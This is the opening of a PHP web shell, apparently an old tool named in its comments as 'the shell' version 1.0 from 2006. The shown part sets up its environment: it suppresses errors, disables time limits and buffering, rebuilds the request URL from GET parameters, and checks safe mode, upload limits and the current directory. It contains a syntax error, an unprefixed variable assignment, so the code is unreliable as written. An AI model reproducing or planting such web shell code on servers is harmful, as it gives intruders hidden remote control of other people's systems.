<?php
$GLOB['SHELL']['Ver']='1.0'; /* ver of the shell */
$GLOB['SHELL']['Date']='26.04.2006';

if (headers_sent()) 
	$DXGLOBALSHIT=true; 
else 
	DXGLOBALSHIT=FALSE; /* This means if bug.php has fucked up the output and headers are already sent =(( lot's of things become HARDER */
@ob_clean();
$DX_Header_drawn=false;

###################################################################################
####################++++++++++++# C O M M O N #++++++++++++++++####################
###################################################################################
@set_magic_quotes_runtime(0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
@ini_set('output_buffering',0);
@error_reporting(E_ALL);

$GLOB['URL']['+Get']=$_SERVER['PHP_SELF'].'?'; /* this filename + $_GET string */
	if (!empty($_GET))
		for ($i=0, $INDEXES=array_keys($_GET), $COUNT=count($INDEXES); 	$i<$COUNT; $i++)
			$GLOB['URL']['+Get'].=$INDEXES[$i].='='.$_GET[ $INDEXES[$i] ].( ($i==($COUNT-1))?'':'&' );
$GLOB['PHP']['SafeMode']=(bool)ini_get('safe_mode');
$GLOB['PHP']['upload_max_filesize']=((integer)str_replace(array('K', 'M'), array('000', '000000'), ini_get('upload_max_filesize')));


$GLOB['FILES']['CurDIR']=getcwd();

?>